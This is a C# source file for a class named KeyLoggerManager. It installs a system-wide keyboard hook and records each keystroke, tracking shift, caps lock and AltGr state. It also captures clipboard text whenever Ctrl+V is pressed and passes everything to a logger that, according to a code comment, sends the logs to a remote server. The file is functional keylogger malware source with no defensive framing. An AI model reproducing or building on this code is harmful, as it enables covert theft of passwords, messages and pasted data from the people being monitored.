using System.Windows.Forms;

namespace KeyLogger
{
    /// <summary>
    /// Class handling the key pressed events sent by the KeyboardHook
    /// </summary>
    public class KeyLoggerManager
    {
        KeyboardHook keyboardHook;

        public Logger logger;

        bool capsState;

        bool altGrState;

        bool ctrlState;

        public delegate void LogCallBack(string elementToLog);  // to remove
        public event LogCallBack LogKeyEvent;                   //to remove


        /// <summary>
        /// Constructor, the parameters are used in the Logger constructor,
        /// initialize events
        /// </summary>
        /// <param name="serverURL">Adress of the server where to send logs</param>
        /// <param name="logsMaxSize">Number of chars the 'logs' variable is allowed to contain</param>
        public KeyLoggerManager(string serverURL, int logsMaxSize)
        {
            keyboardHook = new KeyboardHook();
            keyboardHook.KeyDown += KeyboardHook_KeyDown;
            keyboardHook.KeyUp += KeyboardHook_KeyUp;

            logger = new Logger(serverURL, logsMaxSize);
        }


        /// <summary>
        /// Install the keyboard hook
        /// </summary>
        public void Process()
        {
            keyboardHook.Install();            

            capsState = Control.IsKeyLocked(Keys.CapsLock);
            altGrState = false;
            ctrlState = false;
        }


        /// <summary>
        /// When a key is pressed
        /// </summary>
        /// <param name="key"></param>
        private void KeyboardHook_KeyDown(string key)
        {
            if (key == "CAPITAL")
            {
                capsState = !capsState;
            }
            else if (key == "LSHIFT" || key == "RSHIFT")
            {
                capsState = true;
            }
            else if (key == "ALTGR")     // incorrect key
            {
                altGrState = true;
            }
            else if (key == "LCONTROL" || key == "RCONTROL")
            {
                ctrlState = true;
            }
            else if (key == "SPACE")
            {
                LogKeyEvent(" ");
                logger.LogKey(" ");
            }
            else if (key[0] == ':')
            {
                // Displayable special keys
                if (capsState)
                {
                    if (KeyboardKeys.SpecialShiftKeys.ContainsKey(key))
                    {
                        LogKeyEvent(KeyboardKeys.SpecialShiftKeys[key]);
                        logger.LogKey(KeyboardKeys.SpecialShiftKeys[key]);
                    }
                }
                else if (altGrState)
                {
                    if (KeyboardKeys.SpecialAltGrKeys.ContainsKey(key))
                    {
                        LogKeyEvent(KeyboardKeys.SpecialAltGrKeys[key]);
                        logger.LogKey(KeyboardKeys.SpecialAltGrKeys[key]);
                    }
                }
                else
                {
                    LogKeyEvent(KeyboardKeys.SpecialKeys[key]);
                    logger.LogKey(KeyboardKeys.SpecialKeys[key]);
                }
            }
            else if (key.Length == 1)
            {
                // Normal characters (alpha + num)
                if ((key == "V" || key == "C") && ctrlState)
                {
                    if(key == "V")
                    {
                        LogKeyEvent("<<Pasted>>" + Clipboard.GetText() + "<</Pasted>>");
                        logger.LogKey("<<Pasted>>" + Clipboard.GetText() + "<</Pasted>>");
                    }
                }
                else if (key == "E" && altGrState)
                {
                    LogKeyEvent("€");
                    logger.LogKey("€");
                }
                else
                {
                    LogKeyEvent(capsState ? key : key.ToLower());
                    logger.LogKey(capsState ? key : key.ToLower());
                }
            }
            else
            {
                // Undisplayable special chars
                LogKeyEvent("\n<" + key + ">\n");
                logger.LogKey("<" + key + ">");
            }
        }


        /// <summary>
        /// When a key is released
        /// </summary>
        /// <param name="key"></param>
        private void KeyboardHook_KeyUp(string key)
        {
            if (key == "LSHIFT" || key == "RSHIFT")
            {
                capsState = false;
            }
            else if (key == "ALTGR")
            {
                altGrState = false;
            }
            else if (key == "LCONTROL" || key == "RCONTROL")
            {
                ctrlState = false;
            }
        }


        /// <summary>
        /// Clear all events related to the keyboard hooks, discard the hooks as well
        /// </summary>
        public void ClearHooks()
        {
            keyboardHook.KeyDown -= KeyboardHook_KeyDown;
            keyboardHook.KeyUp -= KeyboardHook_KeyUp;
            keyboardHook.Uninstall();
        }
    }
}
